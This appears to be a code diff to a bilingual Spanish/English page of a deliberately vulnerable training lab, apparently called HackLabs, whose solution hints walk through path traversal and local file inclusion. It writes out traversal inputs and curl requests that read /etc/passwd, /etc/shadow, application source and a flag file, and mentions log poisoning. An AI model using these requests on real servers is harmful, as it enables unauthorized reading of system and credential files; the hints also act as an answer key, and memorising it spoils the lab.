@@ -8,7 +8,7 @@
     <form method="GET" action="/files" class="flex gap-3 items-end mb-4">
       <div class="flex-1">
         <label class="block text-xs text-gray-500 dark:text-gray-400 mb-1 font-medium" data-i18n="lbl_file_path">Ruta del archivo</label>
-        <input type="text" name="file" value="{{ filename | e }}" placeholder="readme.txt"
+        <input type="text" name="file" value="{{ filename | e }}" placeholder="../../../../../etc/passwd"
                class="hl-input font-mono" />
       </div>
       <button type="submit" class="btn-primary flex-shrink-0" data-i18n="btn_read">Leer</button>
@@ -31,9 +31,14 @@
   <div class="lang-content" data-lang="es">
     <h3>Easy — Path traversal directo</h3>
     <ol>
-      <li>El parametro <code>file</code> se concatena con la ruta base <code>static/files/</code> sin ninguna validacion. Lee archivos del sistema directamente:
-        <pre>curl "{{ target_base }}/files?file=/etc/passwd"
-curl "{{ target_base }}/files?file=/etc/shadow"
+      <li>El parametro <code>file</code> se concatena con la ruta base <code>static/files/</code> sin ninguna validacion. En el formulario web introduce rutas relativas con <code>../</code> para escapar del directorio base y leer archivos del sistema:
+        <pre># En el formulario web (campo "Ruta del archivo"):
+../../../../../etc/passwd
+../../../../../etc/shadow
+../../secret/LFI-flag.txt</pre></li>
+      <li>O con curl usando rutas absolutas o traversal:
+        <pre>curl "{{ target_base }}/files?file=../../../../../etc/passwd"
+curl "{{ target_base }}/files?file=../../../../../etc/shadow"
 curl "{{ target_base }}/files?file=/app/app.py"</pre></li>
       <li>Lee el log de acceso (preparacion para log poisoning):
         <pre>curl "{{ target_base }}/files?file=/app/logs/access.log"</pre></li>
@@ -43,9 +48,12 @@ curl "{{ target_base }}/files?file=/app/app.py"</pre></li>
         <pre>curl "{{ target_base }}/files?file=/app/logs/access.log"</pre>
         Deberias ver tu payload PHP en la salida. En un servidor Apache con mod_php, incluir este log via LFI ejecutaria el PHP. En HackLabs (Flask) la ejecucion no ocurre, pero el concepto es identico al explotado en CTFs y servidores reales.</li>
       <li>Directory listing vulnerable y flag dedicada LFI:
-        <pre>curl "{{ target_base }}/secrets"
-curl "{{ target_base }}/secrets/LFI-flag.txt"
-# HL{1f1_53cr375_d1r_3xp053d}</pre></li>
+        <pre># Via traversal en el formulario web:
+../../secret/LFI-flag.txt
+
+# Via endpoint de directorio expuesto:
+curl "{{ target_base }}/secrets"
+curl "{{ target_base }}/secrets/LFI-flag.txt"</pre></li>
     </ol>
     <h3>Medium — Bypass de filtro (strips ../ una vez)</h3>
     <ol>
@@ -73,9 +81,14 @@ curl "{{ target_base }}/files?file=/app/logs/access.log"</pre></li>
   <div class="lang-content" data-lang="en" style="display:none">
     <h3>Easy — Direct path traversal</h3>
     <ol>
-      <li>The <code>file</code> parameter is concatenated with the base path <code>static/files/</code> without any validation. Read system files directly:
-        <pre>curl "{{ target_base }}/files?file=/etc/passwd"
-curl "{{ target_base }}/files?file=/etc/shadow"
+      <li>The <code>file</code> parameter is concatenated with the base path <code>static/files/</code> without any validation. In the web form enter relative paths with <code>../</code> to escape the base directory and read system files:
+        <pre># In the web form ("File path" field):
+../../../../../etc/passwd
+../../../../../etc/shadow
+../../secret/LFI-flag.txt</pre></li>
+      <li>Or with curl using absolute paths or traversal:
+        <pre>curl "{{ target_base }}/files?file=../../../../../etc/passwd"
+curl "{{ target_base }}/files?file=../../../../../etc/shadow"
 curl "{{ target_base }}/files?file=/app/app.py"</pre></li>
       <li>Read the access log (preparation for log poisoning):
         <pre>curl "{{ target_base }}/files?file=/app/logs/access.log"</pre></li>
@@ -85,9 +98,12 @@ curl "{{ target_base }}/files?file=/app/app.py"</pre></li>
         <pre>curl "{{ target_base }}/files?file=/app/logs/access.log"</pre>
         You should see your PHP payload in the output. On an Apache server with mod_php, including this log via LFI would execute the PHP. In HackLabs (Flask) execution does not occur, but the concept is identical to what is exploited in CTFs and real servers.</li>
       <li>Exposed directory listing and dedicated LFI flag:
-        <pre>curl "{{ target_base }}/secrets"
-curl "{{ target_base }}/secrets/LFI-flag.txt"
-# HL{1f1_53cr375_d1r_3xp053d}</pre></li>
+        <pre># Via traversal in the web form:
+../../secret/LFI-flag.txt
+
+# Via exposed directory endpoint:
+curl "{{ target_base }}/secrets"
+curl "{{ target_base }}/secrets/LFI-flag.txt"</pre></li>
     </ol>
     <h3>Medium — Filter bypass (strips ../ once)</h3>
     <ol>
